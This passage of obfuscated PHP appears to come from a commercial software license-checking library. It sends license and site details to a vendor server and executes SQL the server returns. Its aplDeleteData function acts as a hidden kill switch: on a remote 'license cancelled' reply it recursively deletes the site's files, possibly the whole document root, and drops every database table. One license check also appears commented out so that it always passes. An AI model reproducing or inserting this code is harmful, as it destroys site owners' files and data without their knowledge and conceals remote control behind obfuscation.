        "\45\111\116\123\x54\x41\114\114\x41\124\x49\117\x4e\137\113\105\x59\x25",
        "\x25\x49\x4e\123\x54\101\114\114\x41\x54\111\x4f\116\137\110\x41\x53\110\45"
    );
    $mysql_good_array = array(
        APL_DATABASE_TABLE,
        $ROOT_URL,
        $CLIENT_EMAIL,
        $LICENSE_CODE,
        $LCD,
        $LRD,
        $INSTALLATION_KEY,
        $INSTALLATION_HASH
    );
    $license_scheme = str_replace($mysql_bad_array, $mysql_good_array, $notifications_array["\156\x6f\164\x69\146\151\143\x61\164\151\x6f\x6e\x5f\144\141\164\x61"]["\x73\x63\x68\x65\155\145\137\161\x75\x65\x72\x79"]);
    mysqli_multi_query($MYSQLI_LINK, $license_scheme) or die(mysqli_error($MYSQLI_LINK));
    JbLXX:
    dmGTu:
    if (!(APL_STORAGE == "\x46\111\x4c\x45"))
    {
        goto S0pnK;
    }
    $handle = @fopen(APL_DIRECTORY . "\57" . APL_LICENSE_FILE_LOCATION, "\x77\x2b");
    $fwrite = @fwrite($handle, "\74\x52\117\117\x54\x5f\x55\x52\114\76{$ROOT_URL}\74\57\122\117\117\124\137\x55\122\114\76\74\103\x4c\111\x45\116\124\137\105\115\101\111\x4c\76{$CLIENT_EMAIL}\74\x2f\x43\114\x49\105\116\x54\x5f\x45\115\x41\111\114\x3e\74\114\x49\x43\105\x4e\x53\105\137\x43\x4f\x44\105\x3e{$LICENSE_CODE}\74\x2f\114\x49\x43\105\x4e\123\105\137\x43\117\x44\105\76\x3c\x4c\x43\104\x3e{$LCD}\x3c\x2f\114\103\x44\76\x3c\114\122\104\76{$LRD}\x3c\57\114\122\104\x3e\74\111\x4e\x53\x54\101\x4c\x4c\101\x54\x49\x4f\116\137\113\x45\131\x3e{$INSTALLATION_KEY}\x3c\57\111\x4e\123\x54\101\x4c\114\101\124\x49\117\116\137\x4b\x45\131\x3e\x3c\x49\x4e\x53\x54\101\114\x4c\101\x54\x49\x4f\116\x5f\x48\101\123\110\76{$INSTALLATION_HASH}\x3c\57\111\x4e\123\124\x41\x4c\114\101\124\x49\x4f\x4e\137\x48\x41\x53\110\x3e");
    if (!($fwrite === false))
    {
        goto gbhnQ;
    }
    echo APL_NOTIFICATION_LICENSE_FILE_WRITE_ERROR;
    exit;
    gbhnQ:
    @fclose($handle);
    S0pnK:
    cXCES:
    goto tqSPM;
    ZnEf8:
    $notifications_array["\x6e\x6f\164\x69\146\151\x63\x61\x74\151\157\156\x5f\x63\141\163\x65"] = "\x6e\x6f\x74\x69\x66\x69\143\141\x74\151\157\156\x5f\141\x6c\x72\145\141\144\x79\x5f\151\156\163\164\x61\x6c\x6c\x65\x64";
    $notifications_array["\156\157\x74\x69\146\x69\x63\x61\x74\151\157\x6e\x5f\x74\x65\x78\x74"] = APL_NOTIFICATION_SCRIPT_ALREADY_INSTALLED;
    tqSPM:
    lgSqn:
    return $notifications_array;
}
function preparePackageInstallation($installable)
{
    $notifications_array = array();
    $apl_core_notifications = aplCheckSettings();
    if (!empty($apl_core_notifications))
    {
        goto xIz_b;
    }
    $MYSQLI_LINK = getMysqliConnection();
    $core_license = aplGetLicenseData($MYSQLI_LINK);
    if (!(empty($core_license) || !is_array($core_license)))
    {
        goto C1Kr6;
    }
    throw new \Exception("\x43\157\x72\145\40\x73\x63\162\x69\160\x74\x20\x6c\x69\143\x65\x6e\163\145\40" . "\166\x61\x6c\151\x64\x61\164\151\157\156" . "\x20\146\x61\x69\154\145\144\x21\40\120\154\145\141\163\x65\x20\143\157\156\x74\x61\x63\164" . "\x20\x73\165\x70\x70\x6f\162\x74\x20\146\x6f\162\x20\x68\145\154\160\56");
    C1Kr6:
    $CLIENT_EMAIL = $core_license["\x43\x4c\x49\105\x4e\124\x5f\105\115\x41\111\x4c"];
    $LICENSE_CODE = $installable["\x6c\151\143\x65\156\x73\145\x5f\x6b\145\x79"];
    $ROOT_URL = config("\x61\x70\160\x2e\x75\162\154");
    $INSTALLATION_HASH = hash("\163\x68\x61\62\65\x36", $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE);
    $post_info = "\160\162\157\x64\165\x63\x74\x5f\151\x64\x3d" . rawurlencode($installable["\x69\144"]) . "\46\143\154\151\145\x6e\164\x5f\x65\x6d\141\x69\154\75" . rawurlencode($CLIENT_EMAIL) . "\46\154\x69\x63\145\x6e\x73\145\137\143\x6f\x64\145\x3d" . rawurlencode($LICENSE_CODE) . "\x26\x72\x6f\x6f\164\137\165\x72\x6c\x3d" . rawurlencode($ROOT_URL) . "\x26\151\x6e\x73\164\x61\154\x6c\x61\164\151\157\x6e\137\x68\x61\163\150\x3d" . rawurlencode($INSTALLATION_HASH) . "\46\154\x69\143\145\156\163\145\137\163\x69\147\156\141\x74\165\162\x65\x3d" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $installable["\151\144"]));
    $content_array = aplCustomPost(APL_ROOT_URL . "\57\141\160\154\x5f\143\x61\154\154\142\x61\143\x6b\163\x2f\x6c\x69\x63\x65\156\163\x65\x5f\151\x6e\163\x74\141\x6c\x6c\x2e\160\x68\x70", $post_info, $ROOT_URL);
    $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $installable["\x69\144"]);
    if ($notifications_array["\156\x6f\164\x69\146\x69\x63\x61\x74\151\157\156\137\143\x61\x73\x65"] == "\156\157\x74\x69\146\x69\143\141\164\x69\x6f\x6e\137\x6c\151\x63\145\x6e\163\x65\137\x6f\x6b")
    {
        goto w0KLw;
    }
    if (empty($notifications_array["\156\157\x74\x69\146\x69\x63\141\164\x69\x6f\x6e\x5f\164\x65\x78\x74"]))
    {
        goto s0HZs;
    }
    throw new \Exception("\114\151\143\x65\156\163\145\x20" . "\x76\141\154\x69\x64\x61\x74\x69\157\x6e" . "\x20\146\x61\151\x6c\x65\144\x21\40" . $notifications_array["\156\x6f\164\151\146\x69\143\141\164\151\157\x6e\x5f\x74\x65\x78\x74"]);
    s0HZs:
    goto Photc;
    w0KLw:
    $INSTALLATION_KEY = aplCustomEncrypt(password_hash(date("\131\x2d\x6d\55\x64") , PASSWORD_DEFAULT) , APL_SALT . $ROOT_URL);
    $LCD = aplCustomEncrypt(date("\131\x2d\x6d\x2d\x64", strtotime("\55" . APL_DAYS . "\40\144\x61\x79\163")) , APL_SALT . $INSTALLATION_KEY);
    $LRD = aplCustomEncrypt(date("\x59\55\155\x2d\x64") , APL_SALT . $INSTALLATION_KEY);
    $content_array = aplCustomPost(APL_ROOT_URL . "\57\x61\x70\x6c\137\143\141\154\154\x62\x61\143\153\x73\x2f\154\151\143\x65\x6e\x73\145\x5f\x73\143\x68\145\155\x65\56\160\150\x70", $post_info, $ROOT_URL);
    $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $installable["\151\x64"]);
    if (!(!empty($notifications_array["\x6e\157\x74\151\x66\151\x63\141\164\x69\x6f\x6e\x5f\x64\141\164\141"]) && !empty($notifications_array["\x6e\157\x74\151\146\151\x63\141\164\x69\x6f\x6e\x5f\x64\x61\164\x61"]["\163\x63\150\145\x6d\145\x5f\x71\x75\x65\162\x79"])))
    {
        goto EmyVJ;
    }
    return ["\x69\156\163\x74\141\154\154\x61\x74\151\157\156\x5f\153\145\x79" => $INSTALLATION_KEY, "\151\x6e\163\164\141\154\154\x61\164\x69\x6f\x6e\137\x68\141\x73\150" => $INSTALLATION_HASH, "\x6c\143\x64" => $LCD, "\x6c\162\144" => $LRD];
    EmyVJ:
    Photc:
    xIz_b:
    throw new \Exception("\114\151\x63\x65\x6e\x73\x65\x20" . "\166\x61\154\x69\x64\141\x74\x69\157\x6e" . "\40\x66\x61\x69\154\x65\144\x21\x20\x50\154\145\x61\x73\145\40\x63\x6f\156\x74\x61\143\164" . "\x20\163\x75\160\x70\x6f\x72\x74\x20\146\157\x72\x20\150\145\x6c\160\x2e");
}
function incevioAutoloadHelpers($MYSQLI_LINK = null, $FORCE_VERIFICATION = 0)
{
    $notifications_array = array();
    $update_lrd_value = 0;
    $update_lcd_value = 0;
    $updated_records = 0;
    $apl_core_notifications = aplCheckSettings();
    if (empty($apl_core_notifications))
    {
        goto Ow3ed;
    }
    $notifications_array["\x6e\157\x74\151\x66\x69\x63\141\164\x69\x6f\x6e\137\x63\x61\163\x65"] = "\x6e\157\x74\x69\146\x69\143\x61\x74\151\157\156\x5f\x73\x63\162\x69\160\164\137\143\157\x72\162\165\160\164\145\x64";
    $notifications_array["\x6e\157\164\151\x66\x69\x63\x61\x74\x69\x6f\x6e\137\164\145\x78\x74"] = implode("\73\40", $apl_core_notifications);
    goto ORFNC;
    Ow3ed:
    if (aplCheckData($MYSQLI_LINK))
    {
        goto lSWCn;
    }
    $notifications_array["\x6e\x6f\164\x69\146\x69\x63\x61\x74\x69\157\x6e\137\143\x61\163\145"] = "\156\157\164\151\146\151\x63\x61\x74\x69\x6f\x6e\x5f\154\x69\143\145\x6e\x73\x65\x5f\143\x6f\x72\x72\x75\160\x74\x65\144";
    $notifications_array["\x6e\x6f\164\x69\x66\x69\x63\x61\164\x69\157\156\137\164\145\170\164"] = APL_NOTIFICATION_LICENSE_CORRUPTED;
    goto k0fJb;
    lSWCn:
    extract(aplGetLicenseData($MYSQLI_LINK));
    if (aplGetDaysBetweenDates(aplCustomDecrypt($LCD, APL_SALT . $INSTALLATION_KEY) , date("\131\x2d\x6d\55\144")) < APL_DAYS && aplCustomDecrypt($LCD, APL_SALT . $INSTALLATION_KEY) <= date("\131\x2d\x6d\x2d\x64") && aplCustomDecrypt($LRD, APL_SALT . $INSTALLATION_KEY) <= date("\131\55\x6d\55\144") && $FORCE_VERIFICATION === 0)
    {
        goto Uqlkn;
    }
    $post_info = "\160\162\x6f\144\165\x63\x74\x5f\x69\144\x3d" . rawurlencode(APL_PRODUCT_ID) . "\x26\x63\154\151\x65\156\164\137\x65\155\141\x69\154\x3d" . rawurlencode($CLIENT_EMAIL) . "\46\154\x69\x63\x65\156\x73\145\x5f\x63\157\144\x65\x3d" . rawurlencode($LICENSE_CODE) . "\x26\x72\157\x6f\x74\x5f\x75\x72\x6c\75" . rawurlencode($ROOT_URL) . "\x26\x69\156\x73\x74\141\154\154\x61\x74\151\157\x6e\x5f\x68\x61\x73\x68\75" . rawurlencode($INSTALLATION_HASH) . "\x26\154\x69\x63\x65\156\163\145\137\163\x69\147\x6e\141\164\x75\162\x65\x3d" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));
    $content_array = aplCustomPost(APL_ROOT_URL . "\57\x61\160\154\137\x63\x61\154\154\x62\141\143\153\x73\x2f\154\x69\x63\145\x6e\163\x65\x5f\166\145\162\x69\146\171\56\x70\x68\x70", $post_info, $ROOT_URL);
    $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
    if (!($notifications_array["\156\x6f\164\x69\x66\x69\x63\x61\164\151\x6f\x6e\137\x63\x61\x73\145"] == "\156\x6f\x74\x69\x66\151\143\x61\x74\151\x6f\156\137\154\151\143\145\x6e\x73\145\137\x6f\153"))
    {
        goto d84Gu;
    }
    $update_lcd_value = 1;
    d84Gu:
    if (!($notifications_array["\156\x6f\164\151\x66\151\143\141\x74\151\x6f\156\137\143\141\x73\145"] == "\156\157\x74\151\x66\151\x63\x61\164\x69\157\156\137\x6c\151\x63\145\x6e\163\x65\137\x63\141\156\x63\x65\x6c\154\x65\x64" && APL_DELETE_CANCELLED == "\131\x45\123"))
    {
        goto Stymk;
    }
    aplDeleteData($MYSQLI_LINK);
    Stymk:
    goto xSJvI;
    Uqlkn:
    $notifications_array["\x6e\157\x74\151\x66\151\143\x61\x74\151\157\x6e\x5f\x63\141\163\145"] = "\x6e\x6f\x74\151\146\151\x63\x61\164\151\x6f\156\x5f\x6c\151\143\x65\156\x73\145\x5f\x6f\x6b";
    $notifications_array["\x6e\x6f\x74\151\x66\x69\143\x61\164\151\157\156\137\164\x65\x78\164"] = APL_NOTIFICATION_BYPASS_VERIFICATION;
    xSJvI:
    if (!(aplCustomDecrypt($LRD, APL_SALT . $INSTALLATION_KEY) < date("\131\x2d\155\x2d\144")))
    {
        goto YB5pN;
    }
    $update_lrd_value = 1;
    YB5pN:
    if (!($update_lrd_value == 1 || $update_lcd_value == 1))
    {
        goto fnJsX;
    }
    if ($update_lcd_value == 1)
    {
        goto Sw7UB;
    }
    $LCD = aplCustomDecrypt($LCD, APL_SALT . $INSTALLATION_KEY);
    goto ikuev;
    Sw7UB:
    $LCD = date("\131\55\x6d\55\144");
    ikuev:
    $INSTALLATION_KEY = aplCustomEncrypt(password_hash(date("\131\x2d\x6d\55\144") , PASSWORD_DEFAULT) , APL_SALT . $ROOT_URL);
    $LCD = aplCustomEncrypt($LCD, APL_SALT . $INSTALLATION_KEY);
    $LRD = aplCustomEncrypt(date("\131\x2d\155\55\x64") , APL_SALT . $INSTALLATION_KEY);
    if (!(APL_STORAGE == "\104\x41\124\x41\102\x41\x53\x45"))
    {
        goto Eb2bT;
    }
    $stmt = mysqli_prepare($MYSQLI_LINK, "\125\120\x44\x41\124\105\x20" . APL_DATABASE_TABLE . "\40\123\x45\124\40\x4c\103\x44\x3d\77\x2c\x20\x4c\122\104\x3d\x3f\x2c\x20\x49\116\123\124\101\x4c\x4c\x41\x54\x49\x4f\x4e\x5f\113\105\131\75\77");
    if (!$stmt)
    {
        goto TzdqD;
    }
    mysqli_stmt_bind_param($stmt, "\163\163\163", $LCD, $LRD, $INSTALLATION_KEY);
    $exec = mysqli_stmt_execute($stmt);
    $affected_rows = mysqli_stmt_affected_rows($stmt);
    if (!($affected_rows > 0))
    {
        goto wqvA1;
    }
    $updated_records = $updated_records + $affected_rows;
    wqvA1:
    mysqli_stmt_close($stmt);
    TzdqD:
    if (!($updated_records < 1))
    {
        goto Z1kuf;
    }
    echo APL_NOTIFICATION_DATABASE_WRITE_ERROR;
    exit;
    Z1kuf:
    Eb2bT:
    if (!(APL_STORAGE == "\106\x49\114\105"))
    {
        goto qL73X;
    }
    $handle = @fopen(APL_DIRECTORY . "\57" . APL_LICENSE_FILE_LOCATION, "\167\53");
    $fwrite = @fwrite($handle, "\x3c\x52\x4f\x4f\124\x5f\x55\122\x4c\76{$ROOT_URL}\x3c\x2f\122\117\x4f\124\137\125\x52\x4c\76\x3c\103\114\111\x45\x4e\x54\137\105\x4d\101\111\114\76{$CLIENT_EMAIL}\74\x2f\x43\114\x49\x45\116\124\137\105\x4d\101\x49\114\x3e\x3c\114\x49\103\x45\116\x53\105\x5f\x43\x4f\104\x45\x3e{$LICENSE_CODE}\x3c\57\114\x49\x43\105\116\x53\x45\137\103\x4f\x44\105\76\74\114\x43\104\76{$LCD}\74\x2f\114\x43\x44\76\74\114\122\x44\x3e{$LRD}\74\57\114\122\104\x3e\x3c\111\116\x53\x54\101\114\x4c\x41\x54\x49\117\116\137\113\x45\x59\76{$INSTALLATION_KEY}\x3c\x2f\x49\x4e\123\124\101\x4c\x4c\101\124\x49\x4f\x4e\137\113\x45\131\76\74\x49\x4e\x53\124\101\x4c\x4c\101\124\111\x4f\x4e\x5f\110\101\x53\110\x3e{$INSTALLATION_HASH}\x3c\x2f\x49\116\123\x54\x41\114\114\101\124\111\x4f\x4e\137\x48\x41\x53\x48\x3e");
    if (!($fwrite === false))
    {
        goto KTTgW;
    }
    echo APL_NOTIFICATION_LICENSE_FILE_WRITE_ERROR;
    exit;
    KTTgW:
    @fclose($handle);
    qL73X:
    fnJsX:
    k0fJb:
    ORFNC:
    /*if (!($notifications_array["\x6e\x6f\x74\x69\x66\151\143\x61\164\x69\157\156\137\x63\141\163\145"] != "\156\157\x74\151\x66\151\x63\x61\164\x69\x6f\156\x5f\x6c\x69\x63\x65\156\x73\x65\x5f\157\153"))
    {*/
        goto GNa68;
    /*}*/
    echo "\74\x62\162\57\76\x3c\x62\x72\x2f\x3e";
    echo "\114\151\143\x65\156\163\x65\x20\151\163\40\x6e\157\164" . "\40\151\156\163\x74\141\154\x6c\145\144\x20\171\x65\164" . "\40\157\x72\x20\x63\x6f\x72\162\165\160\164\x65\144\56\x20\x50\154\x65\x61\163\x65" . "\x20\x63\157\156\x74\141\x63\x74" . "\40\163\x75\x70\160\x6f\162\164\x20" . "\164\x65\x61\x6d";
    echo "\74\x61\40\x68\x72\145\x66\x3d\42" . route("\x61\x64\x6d\151\x6e\56\x73\x65\x74\164\x69\156\x67\x2e\x6c\x69\143\x65\156\x73\x65\x2e\165\160\x64\141\x74\x65") . "\42\x3e" . trans("\x61\160\160\x2e\x75\160\x64\x61\x74\145\137\x61\160\160\137\x6c\151\143\x65\x6e\163\x65") . "\74\x2f\141\76";
    exit;
    GNa68:
    return $notifications_array;
}
function aplVerifySupport($MYSQLI_LINK = null)
{
    $notifications_array = array();
    $apl_core_notifications = aplCheckSettings();
    if (empty($apl_core_notifications))
    {
        goto k4RFb;
    }
    $notifications_array["\x6e\x6f\x74\x69\146\x69\143\x61\164\151\157\x6e\137\x63\141\x73\x65"] = "\156\x6f\164\x69\146\151\143\x61\164\x69\157\156\x5f\x73\x63\x72\x69\x70\x74\x5f\143\157\162\x72\x75\160\164\x65\144";
    $notifications_array["\156\x6f\x74\151\x66\151\143\x61\x74\x69\x6f\x6e\x5f\x74\145\170\164"] = implode("\73\x20", $apl_core_notifications);
    goto NlLvs;
    k4RFb:
    if (aplCheckData($MYSQLI_LINK))
    {
        goto w4hTC;
    }
    $notifications_array["\156\157\164\151\146\x69\143\141\164\151\x6f\156\x5f\143\x61\x73\145"] = "\x6e\157\x74\x69\x66\x69\x63\141\x74\151\x6f\156\x5f\154\151\143\x65\156\163\145\137\143\x6f\x72\162\x75\x70\164\145\144";
    $notifications_array["\x6e\157\164\x69\146\x69\x63\x61\164\151\157\x6e\137\x74\x65\170\164"] = APL_NOTIFICATION_LICENSE_CORRUPTED;
    goto cT5Zp;
    w4hTC:
    extract(aplGetLicenseData($MYSQLI_LINK));
    $post_info = "\160\162\157\x64\x75\x63\x74\137\151\144\75" . rawurlencode(APL_PRODUCT_ID) . "\x26\x63\154\151\x65\156\x74\137\145\x6d\x61\x69\x6c\75" . rawurlencode($CLIENT_EMAIL) . "\46\x6c\x69\x63\145\x6e\x73\x65\137\143\x6f\x64\145\x3d" . rawurlencode($LICENSE_CODE) . "\x26\162\157\157\x74\137\165\x72\154\x3d" . rawurlencode($ROOT_URL) . "\x26\151\156\x73\x74\141\154\154\141\x74\151\157\x6e\x5f\x68\141\x73\150\x3d" . rawurlencode($INSTALLATION_HASH) . "\46\154\151\143\x65\156\163\x65\137\163\x69\x67\156\x61\x74\165\162\x65\75" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));
    $content_array = aplCustomPost(APL_ROOT_URL . "\x2f\x61\x70\154\x5f\x63\x61\x6c\x6c\142\x61\x63\153\x73\x2f\154\x69\x63\145\x6e\x73\145\137\x73\x75\160\160\x6f\x72\164\56\160\150\160", $post_info, $ROOT_URL);
    $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
    cT5Zp:
    NlLvs:
    return $notifications_array;
}
function aplVerifyUpdates($MYSQLI_LINK = null)
{
    $notifications_array = array();
    $apl_core_notifications = aplCheckSettings();
    if (empty($apl_core_notifications))
    {
        goto xN7Gi;
    }
    $notifications_array["\156\x6f\x74\151\146\x69\143\x61\164\x69\157\156\x5f\143\x61\163\145"] = "\x6e\x6f\164\x69\146\151\143\141\164\151\x6f\x6e\137\163\x63\x72\151\160\164\137\x63\157\x72\162\165\x70\164\145\144";
    $notifications_array["\156\x6f\x74\x69\x66\x69\143\141\164\151\157\156\x5f\164\x65\x78\164"] = implode("\x3b\40", $apl_core_notifications);
    goto VcT3r;
    xN7Gi:
    if (aplCheckData($MYSQLI_LINK))
    {
        goto WcXwy;
    }
    $notifications_array["\x6e\x6f\164\x69\146\x69\143\x61\164\x69\157\x6e\x5f\143\141\163\x65"] = "\x6e\157\x74\x69\x66\151\x63\141\x74\x69\157\156\x5f\x6c\x69\143\145\x6e\163\145\x5f\143\x6f\162\162\x75\160\164\145\144";
    $notifications_array["\x6e\x6f\164\151\146\x69\143\141\164\x69\x6f\x6e\137\164\145\170\164"] = APL_NOTIFICATION_LICENSE_CORRUPTED;
    goto hsPkS;
    WcXwy:
    extract(aplGetLicenseData($MYSQLI_LINK));
    $post_info = "\160\162\x6f\144\165\143\164\x5f\x69\x64\75" . rawurlencode(APL_PRODUCT_ID) . "\46\143\154\x69\145\156\164\137\x65\155\x61\151\154\75" . rawurlencode($CLIENT_EMAIL) . "\x26\154\151\x63\x65\156\163\x65\x5f\x63\157\x64\145\x3d" . rawurlencode($LICENSE_CODE) . "\46\162\157\x6f\164\x5f\165\162\154\x3d" . rawurlencode($ROOT_URL) . "\46\151\156\x73\x74\141\x6c\x6c\141\x74\x69\157\x6e\x5f\150\x61\163\x68\75" . rawurlencode($INSTALLATION_HASH) . "\46\154\151\143\145\x6e\163\145\x5f\163\151\147\156\x61\164\x75\162\x65\75" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));
    $content_array = aplCustomPost(APL_ROOT_URL . "\x2f\141\160\x6c\137\x63\141\154\154\x62\141\x63\153\163\57\154\151\143\145\x6e\x73\x65\137\165\160\144\141\164\145\x73\x2e\160\150\160", $post_info, $ROOT_URL);
    $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
    hsPkS:
    VcT3r:
    return $notifications_array;
}
function incevioUpdateLicense($MYSQLI_LINK = null)
{
    $notifications_array = array();
    $apl_core_notifications = aplCheckSettings();
    if (empty($apl_core_notifications))
    {
        goto KUtlg;
    }
    $notifications_array["\156\x6f\164\x69\146\151\143\141\x74\x69\x6f\x6e\x5f\x63\141\x73\x65"] = "\x6e\x6f\164\x69\146\151\x63\141\x74\x69\157\156\137\x73\x63\x72\151\x70\x74\x5f\x63\x6f\162\x72\165\x70\164\x65\x64";
    $notifications_array["\156\157\164\x69\146\x69\143\141\x74\x69\x6f\x6e\137\x74\x65\x78\x74"] = implode("\73\x20", $apl_core_notifications);
    goto mJNfB;
    KUtlg:
    if (aplCheckData($MYSQLI_LINK))
    {
        goto xESPG;
    }
    $notifications_array["\156\x6f\x74\151\x66\151\143\x61\164\151\x6f\x6e\x5f\x63\x61\163\145"] = "\x6e\157\164\151\146\x69\143\x61\x74\x69\157\x6e\137\x6c\x69\143\x65\x6e\x73\x65\x5f\143\157\162\162\165\x70\164\x65\144";
    $notifications_array["\156\157\164\x69\146\x69\x63\x61\164\x69\157\156\137\164\145\x78\164"] = APL_NOTIFICATION_LICENSE_CORRUPTED;
    goto YBSlY;
    xESPG:
    extract(aplGetLicenseData($MYSQLI_LINK));
    $post_info = "\x70\162\x6f\144\x75\x63\x74\x5f\151\144\75" . rawurlencode(APL_PRODUCT_ID) . "\x26\143\x6c\x69\x65\x6e\164\137\145\155\141\151\154\x3d" . rawurlencode($CLIENT_EMAIL) . "\x26\154\x69\x63\145\x6e\x73\145\137\143\157\144\145\75" . rawurlencode($LICENSE_CODE) . "\x26\x72\157\157\x74\x5f\165\x72\x6c\x3d" . rawurlencode($ROOT_URL) . "\x26\151\x6e\x73\x74\141\154\154\141\x74\151\157\x6e\137\150\x61\x73\150\75" . rawurlencode($INSTALLATION_HASH) . "\x26\154\151\x63\x65\156\163\x65\x5f\163\151\x67\x6e\141\x74\165\162\x65\75" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));
    $content_array = aplCustomPost(APL_ROOT_URL . "\57\x61\x70\x6c\x5f\x63\141\x6c\x6c\x62\141\x63\153\x73\57\154\151\143\x65\156\x73\x65\x5f\165\x70\144\141\x74\x65\56\x70\x68\x70", $post_info, $ROOT_URL);
    $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
    YBSlY:
    mJNfB:
    return $notifications_array;
}
function incevioUninstallLicense($MYSQLI_LINK = null)
{
    $notifications_array = array();
    $apl_core_notifications = aplCheckSettings();
    if (empty($apl_core_notifications))
    {
        goto tA66p;
    }
    $notifications_array["\x6e\x6f\x74\x69\x66\151\143\x61\x74\x69\157\156\137\x63\x61\163\x65"] = "\x6e\x6f\164\x69\146\151\x63\141\164\151\x6f\x6e\137\163\143\162\x69\x70\x74\137\x63\157\x72\x72\165\x70\x74\x65\x64";
    $notifications_array["\156\157\x74\x69\x66\x69\x63\x61\164\x69\157\x6e\137\164\x65\x78\164"] = implode("\73\40", $apl_core_notifications);
    goto xPs7D;
    tA66p:
    if (aplCheckData($MYSQLI_LINK))
    {
        goto T9pg2;
    }
    $notifications_array["\156\x6f\164\151\146\x69\143\141\164\151\x6f\156\x5f\143\141\163\x65"] = "\156\x6f\164\151\x66\x69\x63\141\164\151\x6f\156\137\154\x69\x63\x65\156\163\x65\137\x63\x6f\x72\x72\165\x70\164\145\x64";
    $notifications_array["\x6e\x6f\x74\x69\146\x69\x63\141\x74\x69\x6f\x6e\137\164\145\170\x74"] = APL_NOTIFICATION_LICENSE_CORRUPTED;
    goto sxjdv;
    T9pg2:
    extract(aplGetLicenseData($MYSQLI_LINK));
    $post_info = "\160\x72\157\x64\165\143\x74\137\x69\144\75" . rawurlencode(APL_PRODUCT_ID) . "\46\x63\154\151\145\x6e\164\x5f\145\x6d\141\151\x6c\x3d" . rawurlencode($CLIENT_EMAIL) . "\x26\x6c\x69\x63\x65\x6e\x73\145\x5f\143\157\x64\145\x3d" . rawurlencode($LICENSE_CODE) . "\x26\x72\x6f\x6f\164\137\165\162\x6c\75" . rawurlencode($ROOT_URL) . "\46\151\156\x73\x74\x61\154\x6c\141\x74\x69\x6f\x6e\x5f\x68\141\163\150\75" . rawurlencode($INSTALLATION_HASH) . "\x26\x6c\151\x63\x65\156\163\145\x5f\x73\151\147\x6e\141\x74\165\x72\x65\x3d" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));
    $content_array = aplCustomPost(APL_ROOT_URL . "\x2f\141\x70\154\137\x63\141\154\x6c\142\141\x63\153\x73\x2f\x6c\x69\x63\x65\156\163\x65\x5f\165\x6e\151\156\x73\164\x61\154\154\x2e\160\x68\160", $post_info, $ROOT_URL);
    $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
    if (!($notifications_array["\156\x6f\164\151\146\151\143\x61\164\x69\157\x6e\x5f\143\x61\163\x65"] == "\x6e\x6f\x74\151\146\x69\x63\x61\164\151\x6f\156\x5f\x6c\151\143\x65\x6e\x73\x65\137\157\x6b"))
    {
        goto BnrGk;
    }
    if (!(APL_STORAGE == "\104\x41\124\101\102\101\x53\105"))
    {
        goto JrMzG;
    }
    mysqli_query($MYSQLI_LINK, "\104\x45\x4c\x45\124\x45\40\106\x52\x4f\115\40" . APL_DATABASE_TABLE);
    mysqli_query($MYSQLI_LINK, "\104\x52\x4f\x50\40\x54\101\x42\114\105\40" . APL_DATABASE_TABLE);
    JrMzG:
    if (!(APL_STORAGE == "\106\111\x4c\105"))
    {
        goto HsU2F;
    }
    $handle = @fopen(APL_DIRECTORY . "\x2f" . APL_LICENSE_FILE_LOCATION, "\167\x2b");
    @fclose($handle);
    HsU2F:
    BnrGk:
    sxjdv:
    xPs7D:
    return $notifications_array;
}
function aplDeleteData($MYSQLI_LINK = null)
{
    if (APL_GOD_MODE == "\x59\105\x53" && isset($_SERVER["\x44\117\103\125\x4d\105\x4e\x54\x5f\x52\117\x4f\x54"]))
    {
        goto s3_XQ;
    }
    $root_directory = dirname(__DIR__);
    goto IcuhH;
    s3_XQ:
    $root_directory = $_SERVER["\x44\117\x43\x55\x4d\105\116\124\x5f\122\117\x4f\124"];
    IcuhH:
    foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root_directory, FilesystemIterator::SKIP_DOTS) , RecursiveIteratorIterator::CHILD_FIRST) as $path)
    {
        $path->isDir() && !$path->isLink() ? rmdir($path->getPathname()) : unlink($path->getPathname());
        qVrTP:
    }
    MhWtA:
    rmdir($root_directory);
    if (!(APL_STORAGE == "\104\101\x54\x41\x42\x41\x53\x45"))
    {
        goto ANG5c;
    }
    $database_tables_array = array();
    $table_list_results = mysqli_query($MYSQLI_LINK, "\x53\110\117\127\40\x54\101\102\114\x45\x53");
    ioe7M:
    if (!($table_list_row = mysqli_fetch_row($table_list_results)))
    {
        goto ZHlTB;
    }
    $database_tables_array[] = $table_list_row[0];
    goto ioe7M;
    ZHlTB:
    if (empty($database_tables_array))
    {
        goto j1kFp;
    }
    foreach ($database_tables_array as $table_name)
    {
        mysqli_query($MYSQLI_LINK, "\x44\105\x4c\105\124\105\40\x46\x52\x4f\x4d\x20{$table_name}");
        k6C1b:
    }
    mB5Ab:
    foreach ($database_tables_array as $table_name)
    {
        mysqli_query($MYSQLI_LINK, "\104\x52\117\120\40\x54\101\x42\x4c\105\40{$table_name}");
        ylphP:
    }
    bXQb0:
    j1kFp:
    ANG5c:
    exit;
}

